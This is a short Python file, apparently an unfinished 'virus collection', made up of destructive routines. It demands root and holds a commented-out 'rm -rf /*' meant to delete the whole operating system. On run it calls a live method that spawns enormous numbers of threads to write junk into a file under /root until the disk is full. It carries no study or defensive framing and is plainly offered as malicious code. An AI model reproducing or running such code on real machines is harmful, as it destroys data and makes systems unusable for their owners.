# Under Development


import subprocess
import os
import threading


class VirusCollection:
    def __init__(self):
        try:
            currentUser = subprocess.check_output("whoami", shell=True)
            currentUser = currentUser.decode().replace(" ", "").replace("\n", "")
            if currentUser != "root":
                print("Fuckin run this script as a root user")
                exit()
        except Exception:
            print("Something went really bad here. Oopse!")


    # Delets the whole OS
    def directKiller(self):
        # subprocess.call("rm -rf /*", shell=True)
        print("Malicious Code that deletes all")



    # Filling the disk space
    def fillTheDiskSpace(self):

        f = open("/root/.overload.txt", "a")

        def writeItFast():
            f.write("0011111010100101010000010101010")


        def reqThread(yourObject, threadLen=200000, rounds=45000):
            for i in range(0, rounds):
                threads = list()
                for i in range(0, threadLen):
                    x = threading.Thread(target=yourObject)
                    threads.append(x)
                    x.start()

                for i, thread in enumerate(threads):
                    thread.join()
        reqThread(writeItFast)
        print("Hello")


vir = VirusCollection()
vir.fillTheDiskSpace()
